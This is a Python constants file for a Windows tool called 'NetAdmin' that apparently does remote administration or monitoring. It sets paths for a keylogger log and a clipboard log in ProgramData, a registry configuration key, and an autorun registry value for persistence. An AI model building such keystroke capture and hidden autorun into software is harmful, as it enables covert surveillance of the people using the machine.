import os
import winreg
from os import path
import sys

loggerName = "mainlogger"
REGISTRY_KEY_PATH = (winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration") # (key, sub_key)
PROGRAMDATA_NETADMIN_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\") #in programdata
KEYLOGGER_FILE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylogger2.txt") #in programdata
CLIPBOARD_FILE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\clipboard2.txt") #in programdata
if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
    TURBOJPEG_PATH = r"C:\Users\guyst\Desktop\NetAdmin\project\server\lib_bin\turbojpeg-bin\turbojpeg.dll"
else:
    TURBOJPEG_PATH = path.abspath(path.join(path.dirname(__file__), 'turbojpeg.dll'))
AUTORUN_REG_VALUE = PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe --run_main"